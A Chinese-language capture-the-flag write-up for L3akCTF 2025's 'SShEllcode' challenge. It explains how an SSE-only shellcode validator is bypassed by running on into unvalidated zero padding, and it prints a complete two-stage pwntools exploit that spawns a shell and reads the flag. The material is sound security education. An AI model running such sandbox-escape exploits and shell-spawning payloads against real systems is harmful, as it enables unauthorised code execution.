# L3akCTF 2025 SShEllcode Writeup

## 题目简述

SShEllcode 接收至多 `0x200` 字节机器码，用 Capstone 逐条反汇编，只允许 SSE1/SSE2 指令，拒绝所有显式内存操作数，并额外封禁 `MASKMOVDQU`。通过检查的字节会被复制到固定地址 `0x13370000` 的 RWX 页并直接执行。

漏洞在于检查器只验证用户提交的字节，却没有在 payload 末尾插入返回或陷阱。匿名映射其余部分初始全为零，CPU 会继续执行这些未经验证的 `00 00` 字节。它们被解释为 `add byte ptr [rax], al`，正好提供一个隐式的单字节内存写原语。

## 解题过程

### 明确验证边界

服务端的关键检查为：

```python
for insn in md.disasm(code, 0):
    if X86_GRP_SSE1 not in insn.groups \
            and X86_GRP_SSE2 not in insn.groups:
        exit("Whats that fancy instructions")

    for op in insn.operands:
        if op.type == CS_OP_MEM:
            exit("No memory")

    if insn.id == X86_INS_MASKMOVDQU:
        exit("That is a very weird instruction")

    consumed += insn.size

if consumed != len(code):
    exit("I dont know those bytes")
```

之后程序映射一页可读、可写、可执行内存：

```python
addr = libc.mmap(
    0x13370000, 0x1000,
    0x7,       # RWX
    0x32, -1, 0
)
```

检查器只保证 `code[0:len(code)]` 全部由允许指令覆盖；没有限制从 `len(code)` 之后继续取指。

### 用 SSE 指令构造通用寄存器

虽然不能使用普通 `mov r64, imm64`，但 SSE2 允许：

- `pxor`、`pcmpeqd` 构造全零或全一向量；
- `pslld`、`psrld`、`psllq`、`psrlq` 调整位；
- `movd`、`movq` 将 XMM 寄存器低位送入通用寄存器。

官方 payload 用这些指令最终构造出：

```text
RAX = 0x133701c6
RDI = 0
RSI = 0x13370000
RDX = 0x000000050fc03100
RSP = 0x13370200
```

第一阶段长度为 `0x1c0`。其主体如下，末尾用允许的 `pxor` 填充到所需布局：

```python
from pwn import *

context.arch = "amd64"

payload = asm("""
    pxor xmm0, xmm0
    movq rdi, xmm0
    pcmpeqd xmm1, xmm1
    pslld xmm1, 31
    psrld xmm1, 3
    pxor xmm0, xmm1
    psrld xmm1, 3
    pxor xmm0, xmm1
    psrld xmm1, 1
    pxor xmm0, xmm1
    psrld xmm1, 3
    pxor xmm0, xmm1
    psrld xmm1, 1
    pxor xmm0, xmm1
    psrld xmm1, 2
    pxor xmm0, xmm1
    psrld xmm1, 1
    pxor xmm0, xmm1
    psrld xmm1, 1
    pxor xmm0, xmm1
    movd esi, xmm0
    psrld xmm1, 7
    pxor xmm0, xmm1
    movd esp, xmm0
    pxor xmm0, xmm1
    psrld xmm1, 1
    pxor xmm0, xmm1
    psrld xmm1, 1
    pxor xmm0, xmm1
    psrld xmm1, 1
    pxor xmm0, xmm1
    psrld xmm1, 4
    pxor xmm0, xmm1
    psrld xmm1, 1
    pxor xmm0, xmm1
    movd eax, xmm0
    pxor xmm0, xmm0
    psrld xmm1, 1
    pxor xmm0, xmm1
    pslld xmm1, 4
    pxor xmm0, xmm1
    pslld xmm1, 1
    pxor xmm0, xmm1
    pslld xmm1, 9
    pxor xmm0, xmm1
    pslld xmm1, 1
    pxor xmm0, xmm1
    pslld xmm1, 1
    pxor xmm0, xmm1
    pslld xmm1, 1
    pxor xmm0, xmm1
    pslld xmm1, 1
    pxor xmm0, xmm1
    pslld xmm1, 1
    pxor xmm0, xmm1
    pslld xmm1, 5
    pxor xmm0, xmm1
    pslld xmm1, 2
    pxor xmm0, xmm1
    pslld xmm1, 1
    psllq xmm0, 32
    psrlq xmm0, 24
    movq rdx, xmm0
    psrld xmm1, 7
""") + asm("pxor xmm0, xmm0") * 40

assert len(payload) == 0x1c0
```

### 把零页变成 read syscall

第一阶段结束后，CPU 在 `0x133701c0` 开始执行零字节：

```asm
add byte ptr [rax], al
```

此时 `RAX=0x133701c6`，所以写入目标正是稍后的第 4 条零指令位置；`AL=0xc6`。前三次加法使该字节变成：

$$
(3 \times 0xc6) \bmod 256 = 0x52
$$

`0x52` 是 `push rdx` 的 opcode。CPU 到达 `0x133701c6` 时便执行这条自修改生成的指令。

`RSP` 预先被设为 `0x13370200`，因此 `push rdx` 把 `RDX=0x000000050fc03100` 以小端形式写到 `0x133701f8`：

```text
00 31 c0 0f 05 00 00 00
```

CPU 继续穿过零字节，到 `0x133701f9` 时执行：

```asm
xor eax, eax
syscall
```

此时其他寄存器为：

```text
RAX = 0                 read
RDI = 0                 stdin
RSI = 0x13370000        destination
RDX = large value       maximum length
```

于是获得一次从标准输入向 RWX 页读取第二阶段代码的 `read()`。

### 发送第二阶段

第二阶段会从映射起点覆盖第一页。当前 RIP 位于较高偏移，因此先放足够长的 NOP sled，再接普通 shellcode：

```python
io = remote("challenge.host", 5000)
io.sendline(payload.hex().encode())

sleep(1)
stage2 = b"\x90" * 0x210 + asm(shellcraft.sh())
io.send(stage2)
io.interactive()
```

进入 shell 后读取：

```bash
cat flag.txt
```

得到：

```text
L3AK{n0n_m3m0ry_55h3llc0d3_15_6r347}
```

在仓库所附本地服务上运行同一两阶段 payload，可以稳定获得上述 flag。

## 方法总结

本题的突破点不是寻找一条被遗漏的“危险 SSE 指令”，而是区分静态验证范围和真实执行范围。验证器证明了用户字节合法，却没有证明 CPU 会在这些字节末尾停止；页尾的隐式零填充因此成了攻击面。

整个利用链为“SSE 构造寄存器 → 越过已验证边界 → `00 00` 提供写原语 → 自修改生成 `push rdx` → 在栈上拼出 `read` syscall → 加载常规 shellcode”。审计 shellcode 沙箱时，除 opcode 白名单外，还必须检查控制流闭包、payload 后的内存内容、映射权限以及所有可能的自修改路径。
